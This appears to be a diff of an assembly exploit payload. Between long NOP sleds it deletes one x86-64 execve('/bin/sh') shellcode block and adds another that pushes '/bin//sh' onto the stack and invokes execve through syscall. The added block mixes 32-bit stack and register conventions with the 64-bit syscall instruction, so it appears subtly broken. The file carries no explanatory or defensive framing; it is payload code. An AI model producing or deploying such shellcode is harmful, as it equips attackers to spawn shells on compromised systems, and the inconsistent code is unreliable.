@@ -28,15 +28,6 @@ nop
 nop
 nop
 nop
-  mov rcx, 0x1168732f6e69622f
-  shl rcx, 0x08
-  shr rcx, 0x08
-  push rcx
-  lea rdi, [rsp]
-  xor rdx, rdx
-  xor rsi, rsi
-  mov al, 0x3b
-  syscall
 nop
 nop
 nop
@@ -102,6 +93,20 @@ nop
 nop
 nop
 nop
+nop
+nop
+nop
+xor     eax, eax    
+push    eax         
+push    0x68732f2f  
+push    0x6e69622f  
+mov     ebx, esp    
+push    eax         
+mov     edx, esp    
+push    ebx         
+mov     ecx, esp
+mov     al, 59      
+syscall      
 nop
 nop
 nop
